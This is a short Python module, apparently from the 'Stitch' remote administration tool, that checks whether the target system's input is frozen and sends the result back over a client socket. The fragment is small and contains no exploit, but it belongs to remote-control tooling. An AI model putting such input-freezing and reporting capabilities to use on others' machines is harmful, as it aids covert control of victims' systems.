# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

status = nt_kl.get_frz_status()
if status:
    resp = '[+] System is currently frozen\n'
else:
    resp = '[+] System is not frozen\n'

send(client_socket,resp)
